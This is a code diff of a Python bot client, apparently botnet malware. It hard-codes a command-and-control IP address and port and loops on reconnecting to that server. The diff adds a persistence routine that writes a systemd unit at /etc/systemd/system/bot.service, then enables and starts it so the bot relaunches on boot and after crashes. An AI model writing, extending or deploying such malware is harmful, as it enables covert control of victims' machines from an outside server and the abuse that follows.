@@ -1,4 +1,5 @@
 import socket, threading, time, random, requests, os
+from pathlib import Path
 
 C2_ADDRESS  = "87.106.232.239"
 C2_PORT     = 2045
@@ -228,13 +229,57 @@ def main():
         c2.close()
 
         main()
+
+
+
 def check_internet_connection():
     try:
         requests.get("http://www.google.com", timeout=5)
         return True
     except requests.ConnectionError:
         return False
+
+
+
+def create_systemd_service():
+    service_content = """
+    [Unit]
+    Description=Bot Service
+    After=network.target
+
+    [Service]
+    Type=simple
+    ExecStart=/usr/bin/python3 {script_path}
+    Restart=always
+    User={user}
+    WorkingDirectory={working_directory}
+
+    [Install]
+    WantedBy=multi-user.target
+    """.format(
+        script_path=Path(__file__).resolve(),
+        user=os.getlogin(),
+        working_directory=Path(__file__).parent.resolve()
+    )
+
+    service_file_path = "/etc/systemd/system/bot.service"
+
+    # Check if the service file already exists
+    if not Path(service_file_path).exists():
+        try:
+            with open(service_file_path, 'w') as service_file:
+                service_file.write(service_content)
+            os.system("systemctl daemon-reload")
+            os.system("systemctl enable bot.service")
+            os.system("systemctl start bot.service")
+            print("Service created and started successfully.")
+        except Exception as e:
+            print(f"Failed to create the service: {e}")
+    else:
+        print("Service already exists.")
+
 if __name__ == '__main__':
+    create_systemd_service()
     while True:
         if check_internet_connection():
             main()
